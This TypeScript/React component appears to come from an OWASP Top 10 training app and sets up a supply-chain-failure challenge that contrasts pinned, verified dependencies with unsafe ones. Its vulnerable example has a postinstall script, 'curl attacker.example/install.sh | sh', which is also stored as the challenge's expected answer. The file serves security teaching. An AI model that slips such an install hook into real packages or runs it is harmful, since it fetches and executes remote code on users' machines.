import Top10ChallengeSection from "./Top10ChallengeSection";
import type { ChallengeSectionData } from "./Top10ChallengeSection";

type Props = {
  isSecure: boolean;
};

const data: ChallengeSectionData = {
  secureHeading: "Verified Supply Chain",
  vulnerableHeading: "Supply Chain Failure",
  summary:
    "Software supply chain failures happen when applications trust unsafe packages, build steps, or third-party components.",
  explanation:
    "A compromised dependency can run inside your application even when your own code looks correct.",
  demoTitle: "Dependency audit preview",
  securePreview: {
    lockfile: "package-lock.json",
    installMode: "ci",
    dependencyPolicy: "pinned versions",
    package: {
      name: "ui-utils",
      version: "2.4.1",
      integrity: "sha512-verified",
      maintainerTrusted: true,
    },
  },
  vulnerablePreview: {
    lockfile: "missing",
    installMode: "latest",
    dependencyPolicy: "unreviewed packages allowed",
    package: {
      name: "ui-utils",
      version: "latest",
      integrity: null,
      postinstall: "curl attacker.example/install.sh | sh",
    },
  },
  sideTitle: "What is the risk?",
  risk:
    "Unpinned or untrusted dependencies can introduce malicious code during install, build, or runtime.",
  secureNote: "Dependencies are pinned and verified",
  vulnerableNote: "Untrusted dependency can execute code",
  secureFix:
    "Use lockfiles, trusted registries, dependency review, SBOMs, signatures, and automated vulnerability scanning.",
  link: "https://owasp.org/Top10/2025/A03_2025-Software_Supply_Chain_Failures/",
  challengeTitle: "Supply Chain Challenge",
  challengeDescription:
    "Identify the suspicious install script hidden in the dependency metadata.",
  challengePrompt: "Suspicious script",
  expectedAnswers: ["curl attacker.example/install.sh | sh"],
  success: {
    message: "Challenge completed",
    finding: "Malicious postinstall script detected",
  },
  failure: {
    error: "Wrong value. Look at the dependency postinstall field.",
  },
  secureBlocked: {
    error: "Blocked in secure mode",
    reason: "Package integrity and dependency policy prevent this install.",
  },
};

function SoftwareSupplyChainFailures({ isSecure }: Props) {
  return <Top10ChallengeSection isSecure={isSecure} data={data} />;
}

export default SoftwareSupplyChainFailures;
